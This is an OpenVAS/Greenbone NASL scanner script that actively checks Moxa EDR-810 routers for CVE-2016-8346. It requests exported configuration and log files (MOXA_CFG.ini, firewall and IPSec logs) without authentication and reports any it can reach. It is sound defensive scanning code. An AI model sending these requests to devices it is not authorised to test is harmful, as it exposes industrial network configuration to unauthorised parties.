# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE_PREFIX = "cpe:/o:moxa:edr-810";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106623");
  script_version("2023-09-27T05:05:31+0000");
  script_tag(name:"last_modification", value:"2023-09-27 05:05:31 +0000 (Wed, 27 Sep 2023)");
  script_tag(name:"creation_date", value:"2017-02-28 14:46:57 +0700 (Tue, 28 Feb 2017)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2017-02-23 19:27:00 +0000 (Thu, 23 Feb 2017)");

  script_cve_id("CVE-2016-8346");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Moxa EDR-810 < 3.13 Information Disclosure Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_moxa_edr_devices_consolidation.nasl");
  script_mandatory_keys("moxa/edr/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"Moxa EDR-810 devices are prone to an information disclosure
  vulnerability.");

  script_tag(name:"vuldetect", value:"Tries to access several config and log files via HTTP GET
  requests.");

  script_tag(name:"insight", value:"By accessing a specific URL on the web server, a malicious user
  is able to access configuration and log files. These files are just available if a user or admin
  exported the files first.");

  script_tag(name:"impact", value:"A unauthenticated attacker may gain sensitive information about
  the device.");

  script_tag(name:"affected", value:"Moxa EDR-810 devices using firmware versions prior to 3.13.");

  script_tag(name:"solution", value:"Update the firmware to version 3.13 or later.");

  script_xref(name:"URL", value:"https://www.cisa.gov/news-events/ics-advisories/icsa-16-294-01");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!infos = get_app_port_from_cpe_prefix(cpe: CPE_PREFIX, service: "www", first_cpe_only: TRUE))
  exit(0);

port = infos["port"];
cpe = infos["cpe"];

if (!dir = get_app_location(cpe: cpe, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = make_array("Index.*Bootup.*Date.*Time", "/MOXA_LOG.ini",
                   "! ---------- EDR-810", "/MOXA_CFG.ini",
                   "Content-type: text/plain", "/MOXA_All_LOG.tar.gz",
                   "Index.*Date.*Time.*Event", "/MOXA_IPSec_LOG.ini",
                   "Index.*Date.*Time.*Event", "/MOXA__Firewall_LOG.ini");

report = "The following config and log files are accessible:\n\n";

foreach file (keys(files)) {
  url = dir + files[file];
  if (http_vuln_check(port: port, url: url, pattern: file, check_header: TRUE)) {
    report += http_report_vuln_url(port: port, url: url, url_only: TRUE) + "\n";
    vuln = TRUE;
  }
}

if (vuln)
  security_message(port: port, data: report);

exit(0);
